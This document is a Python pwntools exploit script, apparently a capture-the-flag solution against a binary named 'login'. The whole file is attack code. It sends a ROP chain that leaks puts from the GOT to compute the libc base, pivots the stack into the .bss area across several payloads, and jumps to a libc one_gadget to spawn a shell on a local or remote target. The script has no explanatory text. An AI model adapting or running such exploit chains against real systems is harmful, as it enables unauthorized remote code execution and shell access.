from pwn import *

g_fname = args.FNAME if args.FNAME else "./login"
g_elf = ELF(g_fname)
context.binary = g_elf
g_libcname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"

if (args.LOCAL):
    g_io = process(g_fname)
else:
    rhost, rport = args.REMOTE.split(":")
    g_io = remote(rhost, int(rport))

g_libc = ELF(g_libcname)

def getpid():
    if (args.LOCAL):
        log.info("PID: %d", g_io.proc.pid)
        pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def pwn():
    prdi = 0x401ab3
    leave_ret = 0x40098e
    # call puts; mov eax, 0; call login
    addr_call_puts_and_go_vul = 0x4018B5
    one_gadget = 0x4527a # libc-2.23.so

    payload_leak = flat([
        "admin".ljust(8, '\0'),
        prdi, g_elf.got["puts"],
        addr_call_puts_and_go_vul
    ])
    sa('>', payload_leak)

    payload_migrate = flat([
        "admin".ljust(8, '\0'), 0, 0, 0, 0x602400
    ])
    #getpid()
    sa('>', payload_migrate)
    
    ru("BaileGeBai\n")
    addr_puts = u64(rl(keepends=False).ljust(8, b'\0'))
    libc_base = addr_puts - g_libc.sym["puts"]
    g_libc.address = libc_base
    one_gadget += libc_base
    log.success("puts@%#x\n\tlibc@%#x\n\tone_gadget@%#x" % (addr_puts, libc_base, one_gadget))

    # This payload will start from 0x602400
    payload_getshell = flat([
        "admin".ljust(8, '\0')*3, one_gadget
    ])
    sa('>', payload_getshell)

    # This payload will start from 0x6023f0,
    # so it will overwrite the previous sent payload.
    payload_migrate2 = flat([
        "admin".ljust(8, '\0')*4, 0x602418
    ])
    sa('>', payload_migrate2)

if ("__main__" == __name__):
    if (args.DEBUG):
        context.log_level = "debug"
    pwn()
    g_io.interactive()

